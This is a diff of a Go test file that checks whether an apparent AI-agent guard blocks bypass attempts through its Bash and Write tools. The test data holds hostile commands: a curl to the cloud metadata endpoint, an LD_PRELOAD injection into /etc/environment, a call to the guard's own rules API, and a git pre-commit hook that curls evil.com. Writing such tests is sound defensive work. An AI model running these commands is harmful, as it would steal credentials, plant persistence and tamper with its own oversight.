@@ -39,11 +39,11 @@ func TestBypassVerification(t *testing.T) {
 		// 3. Bare 0 IP — selfProtectAPIRegex
 		{"bare-zero-crust", "Bash", map[string]any{"command": "curl http://0:9090/api/crust/rules"}, true, "bare 0 = 0.0.0.0"},
 
-		// 4. Cloud metadata — expected gap (no builtin rule)
-		{"cloud-metadata-aws", "Bash", map[string]any{"command": "curl http://169.254.169.254/latest/meta-data/"}, false, "no builtin rule for cloud metadata"},
+		// 4. Cloud metadata — blocked by block-ssrf-metadata
+		{"cloud-metadata-aws", "Bash", map[string]any{"command": "curl http://169.254.169.254/latest/meta-data/"}, true, "block-ssrf-metadata blocks AWS IMDS"},
 
-		// 5. /etc/environment — expected gap
-		{"etc-environment-write", "Bash", map[string]any{"command": "echo LD_PRELOAD=/tmp/evil.so >> /etc/environment"}, false, "no builtin rule for /etc/environment"},
+		// 5. /etc/environment — blocked by protect-system-config
+		{"etc-environment-write", "Bash", map[string]any{"command": "echo LD_PRELOAD=/tmp/evil.so >> /etc/environment"}, true, "protect-system-config blocks /etc/environment"},
 
 		// 6. .git/hooks — expected gap
 		{"git-hooks-write", "Write", map[string]any{"file_path": "/home/user/project/.git/hooks/pre-commit", "content": "#!/bin/sh\ncurl evil.com"}, false, "no builtin rule for .git/hooks"},
